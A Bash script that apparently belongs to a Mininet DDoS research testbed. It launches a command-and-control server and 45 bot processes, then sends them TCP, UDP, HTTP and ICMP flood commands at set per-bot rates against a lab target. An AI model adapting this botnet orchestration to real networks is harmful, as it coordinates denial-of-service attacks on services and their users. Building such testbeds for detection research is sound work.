#!/usr/bin/env bash
#
# Traffic2/attack_scripts.sh
# ============================================================================
# DDoS attack orchestration driven through the project's actual botnet:
#
#     operator -> c2.py (in c2srv ns) -> bot.py (in every bot ns) -> target
#
# Unlike Traffic1/attack_scripts.sh (which calls hping3 directly inside each
# bot namespace via mnexec), this script uses the real Command-and-Control
# channel:
#
#   1. Starts botnet/c2.py inside the c2srv namespace (10.0.200.10:6667),
#      with stdin attached to a FIFO so this shell can feed it operator
#      commands ("attack ...", "stop", "list", "ping", "quit").
#   2. Starts botnet/bot.py inside every bot namespace; each bot connects
#      to the C2 over the hidden 10.0.200.0/24 segment (allowed by the
#      iptables ACL on Rc2) and registers itself.
#   3. Waits for the expected number of bots to register.
#   4. Translates a high-level scenario name into one or more "attack"
#      operator commands and writes them into the FIFO. The bots execute
#      pure-Python flood loops (udp / http / tcp / icmp) per botnet/bot.py.
#
# This is the orchestration path the project's threat model actually
# describes (a real botnet sending real commands), and it is the right
# script to use when the experiment is meant to demonstrate C2 traffic
# alongside the DDoS itself.
#
# Scenarios (rates are PER BOT; aggregate is rate * 45 bots):
#     tcp-low        TCP-connect flood :80, 50  pps/bot   (~2.25 kpps total)
#     tcp-medium     TCP-connect flood :80, 200 pps/bot   (~9 kpps total)
#     tcp-high       TCP-connect flood :80, 800 pps/bot   (~36 kpps total)
#     udp-low        UDP flood :53 (512 B), 100 pps/bot
#     udp-medium     UDP flood :53 (512 B), 300 pps/bot
#     udp-high       UDP flood :53 (512 B), 800 pps/bot
#     http-low       HTTP GET flood :80, 25  pps/bot
#     http-medium    HTTP GET flood :80, 50  pps/bot
#     http-high      HTTP GET flood :80, 100 pps/bot
#     icmp           ICMP echo flood, 200 pps/bot
#     mixed          tcp -> udp -> icmp, each phase = duration/3 on ALL bots
#                    (sequential, because c2.py broadcasts to every bot;
#                    a bot can only run one AttackWorker at a time, so
#                    parallel-per-group mixing is not expressible through
#                    the unmodified C2 protocol)
#
# Must run on the VM HOST SHELL (NOT inside the Mininet CLI) with root
# privileges, while the Mininet topology from topology/topo.py is up.
#
# Usage:
#     sudo Traffic2/attack_scripts.sh start                  # bring c2 + bots up
#     sudo Traffic2/attack_scripts.sh <scenario> [duration]  # auto-starts if needed
#     sudo Traffic2/attack_scripts.sh ping                   # liveness probe to bots
#     sudo Traffic2/attack_scripts.sh list                   # show scenarios
#     sudo Traffic2/attack_scripts.sh status                 # show c2 / bot health
#     sudo Traffic2/attack_scripts.sh stop                   # tear everything down
#
# Default duration = 60 s.
# ============================================================================

set -u

# --------------------------------------------------------------------------
# Paths & configuration
# --------------------------------------------------------------------------
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd -- "$SCRIPT_DIR/.." && pwd)"
C2_PY="$PROJECT_ROOT/botnet/c2.py"
BOT_PY="$PROJECT_ROOT/botnet/bot.py"

export TARGET="${TARGET:-10.0.100.10}"
export C2_HOST="${C2_HOST:-10.0.200.10}"
export C2_PORT="${C2_PORT:-6667}"

# All distinct from Traffic1's /tmp paths so both folders can coexist.
RUN_DIR=/tmp/t2
FIFO="$RUN_DIR/c2.fifo"
C2_PIDFILE="$RUN_DIR/c2.pid"
HOLDER_PIDFILE="$RUN_DIR/c2-holder.pid"
BOTS_PIDFILE="$RUN_DIR/bots.pids"
LOGDIR="$RUN_DIR/logs"
C2_LOG="$LOGDIR/c2.log"
ATTACK_LOG="$LOGDIR/attack.log"

DEFAULT_DURATION=60
BOT_REGISTER_TIMEOUT=20      # seconds to wait for all bots to register
GRACE_AFTER_DURATION=4       # extra seconds before declaring the attack done

# All 45 bots as created by topology/topo.py (ISP-A..ISP-E: 14+2+9+5+15).
BOTS_ALL=(
    botA1  botA2  botA3  botA4  botA5  botA6  botA7
    botA8  botA9  botA10 botA11 botA12 botA13 botA14
    botB1  botB2
    botC1  botC2  botC3  botC4  botC5  botC6  botC7  botC8  botC9
    botD1  botD2  botD3  botD4  botD5
    botE1  botE2  botE3  botE4  botE5  botE6  botE7
    botE8  botE9  botE10 botE11 botE12 botE13 botE14 botE15
)
EXPECTED_BOTS=${#BOTS_ALL[@]}

# --------------------------------------------------------------------------
# Helpers
# --------------------------------------------------------------------------
log() {
    mkdir -p "$LOGDIR"
    printf '[%s] %s\n' "$(date +%H:%M:%S)" "$*" | tee -a "$ATTACK_LOG"
}

require_root() {
    if [[ $EUID -ne 0 ]]; then
        echo "ERROR: must be run as root (sudo)." >&2
        exit 1
    fi
}

require_cmd() {
    if ! command -v "$1" >/dev/null 2>&1; then
        echo "ERROR: '$1' not found.${2:+ $2}" >&2
        exit 1
    fi
}

require_file() {
    if [[ ! -f "$1" ]]; then
        echo "ERROR: required file not found: $1" >&2
        exit 1
    fi
}

# Mininet sets each host's bash argv[0] to "mininet:<host>". The end-anchor
# avoids "botA1" matching "botA10".
ns_pid() {
    pgrep -f "mininet:$1\$" 2>/dev/null | head -n 1 || true
}

require_topology() {
    if [[ -z "$(ns_pid target)" ]] || [[ -z "$(ns_pid c2srv)" ]]; then
        echo "ERROR: Mininet topology is not running (target / c2srv missing)." >&2
        echo "       Start it first in another terminal:" >&2
        echo "           sudo python3 topology/topo.py" >&2
        exit 1
    fi
}

# --------------------------------------------------------------------------
# c2.py lifecycle
# --------------------------------------------------------------------------
c2_alive() {
    [[ -f "$C2_PIDFILE" ]] && kill -0 "$(cat "$C2_PIDFILE")" 2>/dev/null
}

start_c2() {
    if c2_alive; then
        log "c2 already running (pid $(cat "$C2_PIDFILE"))"
        return
    fi

    local c2_ns
    c2_ns="$(ns_pid c2srv)"
    if [[ -z "$c2_ns" ]]; then
        echo "ERROR: c2srv namespace not found." >&2
        exit 1
    fi

    mkdir -p "$RUN_DIR" "$LOGDIR"
    rm -f "$FIFO"
    mkfifo "$FIFO"

    # Keepalive writer: keeps the FIFO open for write so c2.py never sees
    # EOF on stdin between operator commands. `sleep infinity' is portable
    # on coreutils-equipped Linux (the Mininet VM has it).
    ( exec 9>"$FIFO"; sleep infinity ) &
    echo $! > "$HOLDER_PIDFILE"

    # Launch c2.py inside the c2srv namespace, stdin <- FIFO. -u keeps the
    # operator log line-buffered so we can scrape "bot REGISTER" promptly.
    mnexec -a "$c2_ns" python3 -u "$C2_PY" \
        --bind 0.0.0.0 --port "$C2_PORT" --log-level info \
        < "$FIFO" > "$C2_LOG" 2>&1 &
    echo $! > "$C2_PIDFILE"

    # Brief wait so the listener is up before bots try to connect.
    sleep 1
    if ! c2_alive; then
        echo "ERROR: c2.py failed to start; see $C2_LOG" >&2
        stop_c2 quiet
        exit 1
    fi
    log "c2.py up (pid $(cat "$C2_PIDFILE"))  log=$C2_LOG"
}

stop_c2() {
    local quiet="${1:-}"

    # Try a graceful shutdown via the operator FIFO first.
    if [[ -p "$FIFO" ]] && c2_alive; then
        echo "quit" > "$FIFO" 2>/dev/null || true
        sleep 0.5
    fi

    if [[ -f "$C2_PIDFILE" ]]; then
        kill -TERM "$(cat "$C2_PIDFILE")" 2>/dev/null || true
        sleep 0.3
        kill -KILL "$(cat "$C2_PIDFILE")" 2>/dev/null || true
        rm -f "$C2_PIDFILE"
    fi
    if [[ -f "$HOLDER_PIDFILE" ]]; then
        kill -KILL "$(cat "$HOLDER_PIDFILE")" 2>/dev/null || true
        rm -f "$HOLDER_PIDFILE"
    fi
    rm -f "$FIFO"

    [[ "$quiet" != "quiet" ]] && log "c2 stopped"
}

c2_send() {
    # Send one operator command line to the running c2.py.
    if ! c2_alive || [[ ! -p "$FIFO" ]]; then
        echo "ERROR: c2 is not running; run '$0 start' first." >&2
        exit 1
    fi
    printf '%s\n' "$*" > "$FIFO"
}

# --------------------------------------------------------------------------
# bot.py lifecycle
# --------------------------------------------------------------------------
spawn_bots() {
    : > "$BOTS_PIDFILE"
    local launched=0 missing=0 h pid
    for h in "${BOTS_ALL[@]}"; do
        pid="$(ns_pid "$h")"
        if [[ -z "$pid" ]]; then
            missing=$((missing+1))
            log "  WARN: $h namespace not found, skipping"
            continue
        fi
        # Each bot writes its own log so post-mortem is per-bot.
        mnexec -a "$pid" python3 -u "$BOT_PY" \
            --c2-host "$C2_HOST" --c2-port "$C2_PORT" \
            --bot-id "$h" --log-level info \
            > "$LOGDIR/bot.$h.log" 2>&1 &
        echo $! >> "$BOTS_PIDFILE"
        launched=$((launched+1))
    done
    log "bots spawned: $launched/${EXPECTED_BOTS} (missing=$missing)"
}

stop_bots() {
    if [[ -f "$BOTS_PIDFILE" ]]; then
        while read -r pid; do
            [[ -z "$pid" ]] && continue
            kill -TERM "$pid" 2>/dev/null || true
        done < "$BOTS_PIDFILE"
        sleep 0.5
        while read -r pid; do
            [[ -z "$pid" ]] && continue
            kill -KILL "$pid" 2>/dev/null || true
        done < "$BOTS_PIDFILE"
        rm -f "$BOTS_PIDFILE"
    fi
    # Belt-and-suspenders: kill any stray bot.py inside every bot ns.
    local h pid
    for h in "${BOTS_ALL[@]}"; do
        pid="$(ns_pid "$h")"
        [[ -z "$pid" ]] && continue
        mnexec -a "$pid" pkill -9 -f "python3 .*bot\.py" 2>/dev/null || true
    done
}

bots_alive_count() {
    local n=0 pid
    [[ -f "$BOTS_PIDFILE" ]] || { echo 0; return; }
    while read -r pid; do
        [[ -z "$pid" ]] && continue
        kill -0 "$pid" 2>/dev/null && n=$((n+1))
    done < "$BOTS_PIDFILE"
    echo "$n"
}

# Wait until c2.log shows EXPECTED_BOTS register events, or we time out.
wait_for_registration() {
    local deadline=$(( $(date +%s) + BOT_REGISTER_TIMEOUT ))
    local seen=0
    while (( $(date +%s) < deadline )); do
        seen=$(grep -c "bot REGISTER" "$C2_LOG" 2>/dev/null || echo 0)
        if (( seen >= EXPECTED_BOTS )); then
            log "all $seen bots registered with c2"
            return 0
        fi
        sleep 0.5
    done
    log "WARN: only $seen/$EXPECTED_BOTS bots registered after ${BOT_REGISTER_TIMEOUT}s"
    log "      attack will still proceed with the bots that did connect"
    return 0
}

# --------------------------------------------------------------------------
# High-level start / stop
# --------------------------------------------------------------------------
cmd_start() {
    require_topology
    require_file "$C2_PY"
    require_file "$BOT_PY"

    if c2_alive && [[ "$(bots_alive_count)" -gt 0 ]]; then
        log "already running: c2 pid=$(cat "$C2_PIDFILE"), bots alive=$(bots_alive_count)"
        return
    fi

    mkdir -p "$RUN_DIR" "$LOGDIR"
    : > "$ATTACK_LOG"
    : > "$C2_LOG"

    log "============================================================"
    log "starting C2 + bots   target=$TARGET  c2=$C2_HOST:$C2_PORT"
    log "============================================================"

    start_c2
    spawn_bots
    wait_for_registration
}

cmd_stop() {
    log "tearing down: bots, then c2"
    stop_bots
    stop_c2
    log "stopped"
}

# --------------------------------------------------------------------------
# Scenario dispatch
# --------------------------------------------------------------------------
ensure_running() {
    if ! c2_alive; then
        log "c2 not running; auto-starting"
        cmd_start
    fi
}

# Issue one operator "attack" command and wait until it should be over.
# Args: method target duration rate [port]
run_phase() {
    local method="$1" tgt="$2" duration="$3" rate="$4" port="${5:-}"
    local cmd="attack $method $tgt $duration $rate"
    [[ -n "$port" ]] && cmd="$cmd --port $port"

    log "phase: $cmd"
    c2_send "$cmd"
    sleep "$duration"
}

run_scenario() {
    local scenario="$1"
    local duration="${2:-$DEFAULT_DURATION}"

    if ! [[ "$duration" =~ ^[0-9]+$ ]] || (( duration < 1 )); then
        echo "ERROR: duration must be a positive integer (got '$duration')" >&2
        exit 2
    fi

    ensure_running

    log "------------------------------------------------------------"
    log "SCENARIO: $scenario   duration: ${duration}s   target: $TARGET"
    log "------------------------------------------------------------"

    case "$scenario" in
        tcp-low)     run_phase tcp  "$TARGET" "$duration" 50  80 ;;
        tcp-medium)  run_phase tcp  "$TARGET" "$duration" 200 80 ;;
        tcp-high)    run_phase tcp  "$TARGET" "$duration" 800 80 ;;

        udp-low)     run_phase udp  "$TARGET" "$duration" 100 53 ;;
        udp-medium)  run_phase udp  "$TARGET" "$duration" 300 53 ;;
        udp-high)    run_phase udp  "$TARGET" "$duration" 800 53 ;;

        http-low)    run_phase http "$TARGET" "$duration" 25  80 ;;
        http-medium) run_phase http "$TARGET" "$duration" 50  80 ;;
        http-high)   run_phase http "$TARGET" "$duration" 100 80 ;;

        icmp)        run_phase icmp "$TARGET" "$duration" 200 ;;

        mixed)
            local third=$(( duration / 3 ))
            (( third < 2 )) && third=2
            run_phase tcp  "$TARGET" "$third" 200 80
            run_phase udp  "$TARGET" "$third" 200 53
            run_phase icmp "$TARGET" "$third" 200
            ;;

        *)
            echo "ERROR: unknown scenario '$scenario'" >&2
            print_scenarios
            exit 2
            ;;
    esac

    # Defensive: tell every bot to stop, in case duration drift left a
    # worker still firing (bot.py self-stops, but a `stop' is cheap).
    sleep "$GRACE_AFTER_DURATION"
    c2_send "stop"
    log "scenario '$scenario' completed"
    echo
    echo "C2 log    : $C2_LOG"
    echo "Bot logs  : $LOGDIR/bot.<bot>.log"
    echo "Master log: $ATTACK_LOG"
}

# --------------------------------------------------------------------------
# Status / info
# --------------------------------------------------------------------------
cmd_status() {
    echo "---- Traffic2 attack_scripts status ----"
    echo "target:     $TARGET"
    echo "c2 host:    $C2_HOST:$C2_PORT"
    echo "expected bots: $EXPECTED_BOTS"

    if c2_alive; then
        echo "c2:         RUNNING (pid $(cat "$C2_PIDFILE"))"
    else
        echo "c2:         not running"
    fi

    if [[ -f "$BOTS_PIDFILE" ]]; then
        echo "bots alive: $(bots_alive_count) / $EXPECTED_BOTS"
    else
        echo "bots alive: 0 (none spawned)"
    fi

    if [[ -f "$C2_LOG" ]]; then
        local registered
        registered=$(grep -c "bot REGISTER" "$C2_LOG" 2>/dev/null || echo 0)
        echo "registered: $registered (cumulative in c2.log)"
    fi

    echo "logs:       $LOGDIR/"
}

cmd_ping() {
    ensure_running
    c2_send "ping"
    log "ping sent to bots; check $C2_LOG for ack lines"
}

print_scenarios() {
    cat <<EOF

Scenarios (operator commands sent to c2.py over the FIFO):

    tcp-low       tcp  flood :80,  50  pps/bot  (~2.25 kpps total)
    tcp-medium    tcp  flood :80,  200 pps/bot  (~9 kpps total)
    tcp-high      tcp  flood :80,  800 pps/bot  (~36 kpps total)
    udp-low       udp  flood :53,  100 pps/bot  (512 B payload)
    udp-medium    udp  flood :53,  300 pps/bot
    udp-high      udp  flood :53,  800 pps/bot
    http-low      http GET   :80,  25  pps/bot
    http-medium   http GET   :80,  50  pps/bot
    http-high     http GET   :80,  100 pps/bot
    icmp          icmp echo  flood, 200 pps/bot
    mixed         tcp -> udp -> icmp, each phase = duration/3 on ALL bots

EOF
}

print_usage() {
    cat <<EOF
Usage: sudo Traffic2/attack_scripts.sh start
       sudo Traffic2/attack_scripts.sh <scenario> [duration_seconds]
       sudo Traffic2/attack_scripts.sh ping
       sudo Traffic2/attack_scripts.sh list
       sudo Traffic2/attack_scripts.sh status
       sudo Traffic2/attack_scripts.sh stop
EOF
    print_scenarios
    cat <<EOF
Default duration = ${DEFAULT_DURATION}s.

Run order for a clean experiment:
    1. sudo python3 topology/topo.py                          # pane A
    2. sudo Traffic2/normal_traffic.sh start                  # pane B
    3. (optional) start a capture on Rdc-eth0                 # pane A
    4. sudo Traffic2/attack_scripts.sh start                  # pane B
    5. sudo Traffic2/attack_scripts.sh <scenario> <duration>  # pane B
    6. sudo Traffic2/attack_scripts.sh stop                   # pane B
    7. sudo Traffic2/normal_traffic.sh stop                   # pane B
EOF
}

# --------------------------------------------------------------------------
# Main
# --------------------------------------------------------------------------
main() {
    require_root
    require_cmd mnexec "Is Mininet installed?"
    require_cmd python3
    require_cmd mkfifo
    require_cmd pgrep

    case "${1:-}" in
        ""|-h|--help|help) print_usage ;;
        start)             cmd_start ;;
        stop)              cmd_stop ;;
        status)            cmd_status ;;
        ping)              cmd_ping ;;
        list)              print_scenarios ;;
        *)                 run_scenario "$@" ;;
    esac
}

main "$@"
